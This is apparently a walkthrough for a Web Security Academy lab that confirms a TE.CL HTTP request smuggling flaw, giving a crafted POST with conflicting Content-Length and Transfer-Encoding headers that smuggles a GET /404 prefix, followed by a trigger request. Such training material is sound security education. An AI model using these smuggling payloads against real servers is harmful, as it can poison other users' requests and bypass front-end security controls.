# Confirming TE.CL with Differential Responses — Simple Guide

You are now doing the **TE.CL** version of the differential attack. 

In CL.TE, the front-end stopped early, leaving a trap. In **TE.CL, the back-end stops early** because it relies on `Content-Length`. We are going to leave a `GET /404` trap in the back-end's memory so the next normal request gets glued to it and returns a 404.

Here is exactly how it works and how to type it without errors.

---

### 🧠 Why this works (The Math)

Look at your payload. The front-end uses `Transfer-Encoding`. The back-end uses `Content-Length: 4`.
*   **Front-end:** Sees the chunk size `7c` (which is hex for 124 bytes). It reads exactly 124 bytes, stops at `0`, and forwards the whole thing.
*   **Back-end:** Ignores the chunks. Sees `Content-Length: 4`. It reads exactly 4 bytes: `7c\r\n`. It stops immediately, leaving everything else (`GET /404...`) in its memory as the "next request."

---

### 🛠️ How to type it perfectly (Step-by-Step)

Make sure you have **HTTP/1.1** selected, **"Update Content-Length" is UNCHECKED**, and you delete any weird HTTP/2 headers (like `Te: trailers`).

**The Attack Request:**
Type this exactly. I've removed the junk headers to keep the math simple:

```http
POST / HTTP/1.1
Host: 0a3100560427c1c3850b3a6300fe00a6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: 0a3100560427c1c3850b3a6300fe00a6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```
*(Important: Press `Enter` one time after the final `0` so there is a blank line at the bottom).*

1. **Click Send.** 
   *(You might get a `400 Bad Request` or a timeout. **This is expected.** The back-end read the first 4 bytes and is now holding the `GET /404` trap).*

**The Trigger Request:**
Now, change your request to this simple GET:

```http
GET / HTTP/1.1
Host: 0a3100560427c1c3850b3a6300fe00a6.web-security-academy.net
Connection: close
```
*(Delete all other headers and the entire body. Make sure there is one blank line at the bottom).*

2. **Click Send.**

The back-end will take your trap and process the `/404` path. You will see a **404 Not Found** response, and the lab is solved! 🎉